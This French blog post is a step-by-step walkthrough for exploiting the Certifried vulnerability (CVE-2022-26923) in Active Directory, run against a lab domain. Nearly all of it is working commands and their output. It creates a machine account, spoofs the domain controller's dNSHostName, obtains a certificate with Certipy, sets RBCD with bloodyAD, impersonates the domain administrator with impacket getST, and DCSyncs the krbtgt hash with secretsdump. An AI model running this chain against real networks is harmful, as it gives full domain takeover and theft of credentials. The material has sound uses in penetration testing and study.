---
title: Exploitation de Certifried (CVE-2022-26923)
summary: Découvrez comment exploiter la vulnérabilité Certifried facilement avec bloodyAD.
date: 2024-05-11
# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
# image:
#   caption: 'Image credit: [**Unsplash**](https://unsplash.com)'

authors:
  - soka
  - admin

tags:
  - Authentication
  - CVE
  - Exploit
  - bloodyAD
  - Microsoft

categories:
  - Active Directory
---

Une nouvelle élévation de privilège est sortie: Certifried (CVE-2022-26923) avec ce [billet de blog](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) après que Microsoft l'ait patché.
Voici un exemple de comment exploiter cette vulnérabilité avec [bloodyAD](https://github.com/CravateRouge/bloodyAD) sans utiliser PKINIT.

## Linux

On a besoin d'une machine, soit on en compromet une ou alors on en crée une si `ms-DS-MachineAccountQuota`>0:

```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 get object 'DC=crashlab,DC=local' --attr ms-DS-MachineAccountQuota                     

distinguishedName: DC=crashlab,DC=local
ms-DS-MachineAccountQuota: 10
```

On crée un objet machine `cve` dans le LDAP:
```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 addComputer cve 'CVEPassword1234*'

[+] cve created
```

Ensuite on change l'attribut `dNSHostName` (vide quand on crée l'objet) pour qu'il corresponde au nom de machine du contrôleur de domaine: `CRASHDC.crashlab.local`.

```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 set object 'CN=cve,CN=Computers,DC=crashlab,DC=local' dNSHostName -v CRASHDC.crashlab.local

[+] CN=cve,CN=Computers,DC=crashlab,DC=local's dnsHostName has been updated
```

On vérifie que l'attribue a été configuré correctement:
```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 get object 'CN=cve,CN=Computers,DC=crashlab,DC=local' --attr dNSHostName                  

distinguishedName: CN=cve,CN=Computers,DC=crashlab,DC=local
dNSHostName: CRASHDC.crashlab.local
```

Et maintenant on utilise [Certipy](https://github.com/ly4k/Certipy) pour demander le certificat pour la machine `cve`:
```ps1
# 10.100.10.13 is the ADCS server
> certipy req 'crashlab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.100.10.12 -ca crashlab-ADCS-CA
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with DNS Host Name 'CRASHDC.crashlab.local'
[*] Saved certificate and private key to 'crashdc.pfx'

```

Maintenant on va essayer de récupérer un TGT en utilisant [Certipy](https://github.com/ly4k/Certipy) avec le certificat demandé précédemment:
```ps1
> certipy auth -pfx ./crashdc.pfx -dc-ip 10.100.10.12
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: crashdc$@crashlab.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

PKINIT ne fonctionne pas sur cet AD, essayons la technique RBCD avec [bloodyAD](https://github.com/CravateRouge/bloodyAD) et sa fonctionnalité d'authentification par certificat:
```ps1
> openssl pkcs12 -in crashdc.pfx -out crashdc.pem -nodes
> python bloodyAD.py -d crashlab.local  -c ":crashdc.pem" -u 'cve$' --host 10.100.10.12 add rbcd 'CRASHDC$' 'CVE$'
[+] CVE$ SID is: S-1-5-21-1945936656-2616711065-1665664270-1134             
[+] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity correctly set        
[+] Delegation rights modified successfully!                                                                           
CVE$ can now impersonate users on CRASHDC$ via S4U2Proxy
```

Les droits de délégation sont en place, maintenant on peut utiliser [impacket](https://github.com/SecureAuthCorp/impacket) `getST.py` pour usurper l'administrateur de domaine (`emacron` dans notre cas) sur CRASHDC$ et on récupère un TGT: 
```ps1
> getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*'                 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                                               
                                                                                                                       
[*] Getting TGT for user                                                                                               
[*] Impersonating emacron                                                                                              
[*]     Requesting S4U2self                                                                                            
[*]     Requesting S4U2Proxy
[*] Saving ticket in emacron.ccache

> cp emacron.ccache /tmp/
> export KRB5CCNAME=/tmp/emacron.ccache
```

Pour finir on utilise [impacket](https://github.com/SecureAuthCorp/impacket) `secretsdump.py` pour réaliser un DCSync avec le TGT récupéré:
```ps1

> secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:492850f62466ef2bd1f4a56f112e01f1::: (status=Disabled)
[*] Cleaning up...
```
